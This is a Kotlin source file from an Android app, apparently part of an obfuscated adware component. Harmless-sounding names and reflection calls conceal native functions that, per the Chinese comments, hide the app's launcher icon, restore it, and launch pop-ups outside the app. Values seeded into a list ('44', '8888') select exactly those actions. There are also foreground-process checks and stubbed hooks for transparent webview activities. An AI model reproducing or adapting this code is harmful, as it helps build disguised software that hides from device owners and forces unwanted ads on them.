package com.water.soak

import android.app.ActivityManager
import android.app.job.JobService
import android.content.Context
import com.tencent.mmkv.MMKV


/**
 * Date：2024/8/12
 * Describe:
 */
object SteamHelper {
    var urlApp = ""
    var isInSteam = false
    private val arrayList = arrayListOf<Any>("Demo")
    private var methodName = "goToOcean"

    fun init(context: Context) {
        MMKV.initialize(context)
        arrayList.add(context)
        arrayList.add("44")
        arrayList.add("8888")
        runCatching {
            val clazz = Class.forName("com.water.soak.SteamHelper")
            val conClazz = Class.forName("android.content.Context")
            clazz.getMethod(methodName, conClazz).invoke(null, arrayList["1".toInt()])
        }
    }

    @JvmStatic
    fun goToOcean(context: Context) {
        val ow = OceanWater(context)
        ow.oceanLake()
    }

    //参数cmd传字符串:字符串包含"hc"隐藏图标,包含"ci"恢复隐藏.包含"qz"外弹(外弹在主进程主线程调用).
    //参数num:"nf"隐藏图标,"lk"恢复隐藏."gi"外弹(外弹在主进程主线程调用).
    //参数num%10==4隐藏图标,num%10==2恢复隐藏.num%10==8外弹(外弹在主进程主线程调用).

    @JvmStatic
    external fun lakeStr(int: Int): Boolean

    // 隐藏2 外弹是 3
    @JvmStatic
    fun getFlagByString(type: String): Int {
        val clazz = Class.forName("com.water.soak.SteamHelper")
        clazz.getMethod("lakeStr", Int::class.java)
            .invoke(null, "${arrayList[type.toInt()]}".toInt())
        return type.toInt()
    }

    @JvmStatic
    external fun aceNm(context: Context): String

    @JvmStatic
    fun isInMe(context: Context): Boolean {
        val am: ActivityManager =
            context.getSystemService(JobService.ACTIVITY_SERVICE) as ActivityManager
        val list0: List<ActivityManager.RunningAppProcessInfo> = am.runningAppProcesses
        for (info in list0) {
            if (!info.processName.equals(context.applicationInfo.processName) || info.importance != 100) {
                continue
            }
            return true
        }
        return false
    }

    //    @Keep IntWv
//    @JvmStatic
//    external fun iceCore(context: Any) //1.传应用context.(在主进程里面初始化一次)

    //    @Keep StartWv
//    @JvmStatic
//    external fun springInit(context: Any) //1.传透明Activity对象(在透明页面onCreate调用).

    //    @Keep  ActWv
//    @JvmStatic
//    external fun soakSeek(idex: Int)

    //    @Keep
//    @JvmStatic
//    external fun snowStr(url: String?, time: Long, type: String?, issuccess: Boolean)
    val mSoakOpenAdImpl by lazy { SoakOpenAdImpl() }

    @JvmStatic
    fun ssSoak(string: String): Any? {
        return TideHelper.inFoUri(string)
    }
}